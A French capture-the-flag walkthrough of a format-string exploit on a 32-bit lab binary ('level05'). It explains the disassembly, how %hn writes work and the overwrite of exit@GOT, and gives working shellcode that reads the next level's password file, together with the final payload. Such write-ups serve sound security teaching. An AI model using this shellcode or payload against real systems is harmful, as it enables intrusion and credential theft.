# level05

## 1. Analyse

Le `main` tient en trois temps : lecture, normalisation, affichage.

### Lecture de l'entrée

```asm
804845d:  mov  0x80497f0,%eax          ; stdin
8048462:  mov  %eax,0x8(%esp)          ; arg3 = stdin
8048466:  movl $0x64,0x4(%esp)         ; arg2 = 0x64 = 100
804846e:  lea  0x28(%esp),%eax         ; buf à 0x28(%esp)
8048475:  call fgets                   ; fgets(buf, 100, stdin)
```

L'entrée est lue par **`fgets` borné à 100 octets** dans un buffer d'environ 104
octets (`0x90 - 0x28`). Il n'y a donc **pas de débordement** possible ici.

### Normalisation : majuscules → minuscules

```asm
804847a:  movl $0x0,0x8c(%esp)         ; i = 0
; corps de boucle (0x8048487) :
8048492:  movzbl (buf+i),%eax          ; c = buf[i]
8048495:  cmp  $0x40,%al ; jle skip    ; si c <= '@' (0x40)  → on saute
80484a7:  cmp  $0x5a,%al ; jg  skip    ; si c >  'Z' (0x5a)  → on saute
80484bb:  xor  $0x20,%edx              ; sinon (c ∈ 'A'..'Z') : c ^= 0x20
80484c9:  mov  %dl,(buf+i)             ; buf[i] = c (devenu minuscule)
80484cb:  addl $0x1,0x8c(%esp)         ; i++
; condition (0x80484d3) : strlen(buf) recalculé via repnz scasb
80484fc:  cmp  %eax,%ebx ; jb loop     ; tant que i < strlen(buf)
```

Pour chaque caractère de la chaîne, si c'est une **majuscule** (`0x41`–`0x5a`,
soit `A`–`Z`), on lui applique `^ 0x20` — ce qui bascule le « bit de casse » et
le transforme en **minuscule** (`A` → `a`). Les autres octets sont laissés tels
quels. La longueur est relue à chaque tour par `repnz scasb` (`strlen`).

### Affichage et sortie

```asm
8048500:  lea  0x28(%esp),%eax
8048504:  mov  %eax,(%esp)
8048507:  call printf                  ; printf(buf)  ← buf passé comme FORMAT
804850c:  movl $0x0,(%esp)
8048513:  call exit                    ; exit(0)
```

La chaîne (après normalisation) est passée **directement à `printf` comme chaîne
de format**, sans aucun argument fixe. Puis `exit(0)` est appelé.

### Résumé

```c
char buf[~104];
fgets(buf, 100, stdin);
for (i = 0; i < strlen(buf); i++)
    if (buf[i] >= 'A' && buf[i] <= 'Z')
        buf[i] ^= 0x20;              // majuscule → minuscule
printf(buf);                         // <-- chaîne de format contrôlée
exit(0);
```

Deux faits structurants pour la suite :

- `printf(buf)` où `buf` est notre entrée → **faille de format string**.
- la boucle de normalisation impose que **tout octet `0x41`–`0x5a` de notre
  entrée sera modifié** (XOR `0x20`) avant d'atteindre `printf`.

## 2. Reconnaissance

### En quoi consiste la faille

`printf(buf)` interprète notre entrée comme **chaîne de format**. `printf` ne
compte pas ses arguments : à chaque spécificateur (`%x`, `%p`, `%n`…) elle lit
« l'argument suivant » sur la pile, qu'il existe ou non. En 32 bits, ces
arguments sont **tous sur la pile**, juste au-dessus du pointeur de format. On
contrôle donc à la fois le format **et** (via le contenu du buffer) les valeurs
que `printf` prendra pour arguments.

### Le problème : lire ne suffit pas

Avec `%x`/`%p` on peut **lire** la pile, mais ici ça ne mène nulle part car  il n'y a **aucune fonction qui lance le shell** dans le binaire (pas de `system`, pas de `/bin/sh` ; seuls `printf`, `fgets`, `exit` sont importés).

Fuir de la mémoire ne donne donc ni shell ni mot de passe. Il faut **détourner
l'exécution** du programme — donc **écrire** en mémoire, pas seulement lire.

### Comment `%hn` résout le problème

`%hn` est un spécificateur qui **écrit** au lieu d'afficher : il écrit le
**nombre d'octets déjà affichés** par `printf`, en **2 octets (short)**, à
l'adresse pointée par son argument.

```
printf("aaaa%hn", &x);   // a affiché 4 octets  →  écrit 4 dans le short *x
```

Il transforme la faille d'une primitive de **lecture** en une primitive
d'**écriture arbitraire** : « écrire la valeur V à l'adresse A ». Deux leviers :

1. **L'adresse A (où écrire)** : on la place au début du buffer, et on la vise
   avec l'accès direct `%10$hn` (le buffer démarre au 10ᵉ paramètre, cf. partie 3).
2. **La valeur V (quoi écrire)** : c'est le **compteur de caractères** de
   `printf`, qu'on gonfle avec un champ de largeur — ex. `%260c` affiche 260
   caractères → le `%hn` suivant écrit 260.

Pourquoi `%hn` (2 octets) et pas `%n` (4 octets) ? Parce qu'écrire une adresse
32 bits d'un coup avec `%n` obligerait à afficher **des milliards** de caractères
(la valeur à écrire). En écrivant par **moitiés de 2 octets**, le compteur ne
dépasse jamais 65535 : on écrit l'adresse en **deux `%hn`**, la moitié basse à
`A` et la moitié haute à `A+2`.

### Ce qu'on vise

`exit()` est appelé **juste après** le `printf` vulnérable. Son entrée dans la
GOT est donc la cible parfaite :

```
exit@GOT = 0x080497e0
```

On écrit, avec `%hn`, l'**adresse d'un shellcode** (placé dans une variable
d'environnement, comme en level04) **dans `exit@GOT`**. Quand `main` appelle
`exit(0)`, le PLT lit l'entrée GOT détournée et saute dans notre shellcode.

### Contraintes à respecter

- **Le filtre majuscules** : aucun octet du payload ne doit tomber dans
  `0x41`–`0x5a` (sinon il est transformé). L'adresse `exit@GOT`
  (`08 04 97 e0`) est hors de cette plage ; il faudra vérifier que l'adresse du
  shellcode l'est aussi.
- **L'octet `0x0a`** : `fgets` s'arrête au `\n`, donc pas de `0x0a` dans le
  payload (ni `0x00`, qui couperait la chaîne de format).

## 3. Exploitation

### Étape 1 — Trouver l'offset du buffer dans l'assembleur

Le point clé : **`printf` lit ses arguments sur la pile, et notre buffer EST sur
cette pile**. On peut donc atteindre son contenu avec les spécificateurs. Reste à
savoir à quel numéro de paramètre il correspond — et ça se lit directement dans
l'asm de l'appel à `printf` :

```asm
8048500:  lea  0x28(%esp),%eax     ; eax = &buf        → buf est à esp+0x28
8048504:  mov  %eax,(%esp)         ; [esp+0] = &buf    → l'argument format est à esp+0
8048507:  call printf
```

Deux adresses à retenir, **toutes deux relatives à `esp`**:

- l'**argument de `printf`** (le pointeur de format) est en `esp+0x00` ;
- le **contenu du buffer** commence en `esp+0x28`.

En 32 bits, chaque argument fait **4 octets**, et `printf` les lit à la suite
**à partir de `esp+4`** (juste après le pointeur de format en `esp+0`) :

```
esp+0x00 : &buf        ← le format lui-même (pas un "%")
esp+0x04 : …           ← %1$      (1er argument lu par un %)
esp+0x08 : …           ← %2$
   ⋮                      ⋮
esp+0x28 : buf[0..3]   ← %10$     (0x28 = 40 = 4 × 10)   ← DÉBUT DE NOTRE BUFFER
esp+0x2c : buf[4..7]   ← %11$
   ⋮
```

La règle : **numéro de paramètre = offset depuis `esp` ÷ 4**. Le buffer est en
`esp+0x28`, donc `0x28 ÷ 4 = 40 ÷ 4 = 10` → son premier dword est lu par **`%10$`**, le
suivant par `%11$`, etc.

On peut confirmer cette position `10` avec une commande qui teste chaque position et repère où réapparaît notre marqueur `aaaa` (= `0x61616161`) :

```sh
python -c 'print "aaaa" + ".%x"*16' | ./level05
```

### Étape 2 — Le shellcode en variable d'environnement

Comme en level04, on met un shellcode « cat du flag » dans une variable d'env —
il lit `/home/users/level06/.pass` et l'écrit sur la sortie :

```sh
export SHELLCODE=$(python -c 'print "\x90"*300 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass"')
```

Les `"\x90"*300` en tête forment un **NOP sled** : une longue suite de `nop`
(l'instruction qui ne fait rien et passe à la suivante). Son intérêt : l'adresse
de `SHELLCODE` renvoyée par `getenv` n'est pas garantie **exacte à l'octet près**
— elle varie légèrement selon la longueur du nom du binaire, des variables d'env,
etc. Sans le sled, il faudrait viser pile le premier octet du shellcode, ce qui
est fragile. Avec le sled, il suffit que l'adresse qu'on écrit tombe **n'importe
où dans les 300 `nop`** : l'exécution « glisse » le long des `nop` jusqu'à
atteindre le vrai shellcode. On transforme ainsi une cible d'un octet en une
cible large de 300 octets, ce qui rend l'exploit nettement plus robuste.

### Étape 3 — Adresse du `SHELLCODE` via getenv

Un petit helper affiche l'adresse de la variable d'environnement :

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    printf("%p\n", getenv("SHELLCODE") + 150);
}
```
**Remarque:**

Le **"+150"** est nécéssaire pour viser le milieu du sled **NOP** afin qu'on puisse tomber sur le début de notre SHELLCODE

```sh
gcc -m32 /tmp/getenv.c -o /tmp/getenv
/tmp/getenv            # ex. 0xffffd792
```

Dans notre cas d'exemple, on obtient **`0xffffd792`**, soit **4,294,956,946** en
décimal — un nombre **énorme**. Impossible de le faire écrire par un seul `%n`
(il faudrait afficher ~4 milliards de caractères). C'est précisément pour ça
qu'on **sépare l'écriture en deux `%hn`** de 2 octets chacun (cf. étape 4).

### Étape 4 — Construire le payload

On veut écrire cette adresse (ex. `0xffffd792` = 4,294,956,946) dans
`exit@GOT = 0x080497e0`. Comme vu à l'étape 3, ce nombre est trop grand pour un
seul `%n` ; on l'écrit donc **en deux moitiés de 2 octets** avec `%hn` :

```
*(short*)0x080497e0 = 0xd792 = 55186   (moitié basse)
*(short*)0x080497e2 = 0xffff = 65535   (moitié haute)
```

Structure du payload :

```
[0x080497e0][0x080497e2]  %<n1>c %10$hn  %<n2>c %11$hn
└── 8 octets d'adresses ─┘ └─ écrit la moitié basse ─┘└─ puis la haute ─┘
```

- Les deux adresses placées au **début du buffer** sont lues en accès direct
  comme **`%10$`** et **`%11$`** (le buffer démarre au 10ᵉ paramètre).
- On écrit d'abord la **plus petite** moitié. Le compteur a déjà affiché les
  **8 octets** d'adresses, donc `n1 = basse − 8`, puis `n2 = haute − basse`.

Avec notre exemple **`0xffffd792`**, on a:
```
python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%55178c%10$hn%10349c%11$hn"' | ./level05
```